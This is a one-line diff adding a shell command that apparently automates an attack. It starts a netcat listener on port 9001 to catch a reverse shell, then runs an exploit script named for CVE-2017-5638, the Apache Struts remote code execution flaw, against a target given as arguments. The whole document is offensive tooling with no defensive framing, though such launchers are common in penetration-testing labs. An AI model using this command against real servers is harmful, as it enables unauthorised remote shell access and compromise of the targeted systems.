@@ -1,0 +1,1 @@
+x-terminal-emulator -e nc -lvnp 9001 & (sleep 3 && python3 cve-2017-5638.py $1 $2)
